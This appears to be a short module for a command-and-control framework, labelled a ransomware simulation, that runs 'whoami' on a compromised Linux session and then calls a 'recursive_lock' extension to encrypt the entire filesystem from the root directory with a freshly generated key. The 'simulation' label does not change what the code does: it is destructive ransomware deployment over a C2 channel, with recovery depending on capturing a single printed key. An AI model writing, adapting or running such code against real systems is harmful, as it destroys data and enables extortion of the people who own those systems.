// Ransomware simulation: recursively encrypt the filesystem on a Linux target.
// A fresh key is generated for every run. Capture it from this module's
// output before anything irreversible happens; it is the only copy.
// Recovery: run decrypt_all_linux with the key as its first argument.
fn run(session_id) {
    print("Encrypting filesystem for session " + session_id);
    send_c2_command(session_id, "shell whoami");
    let key = random_hex_key();
    print("Encryption key for this run: " + key);
    let res = send_c2_extension(session_id, "recursive_lock", ["/", key]);
    return "Deployed: " + res;
}
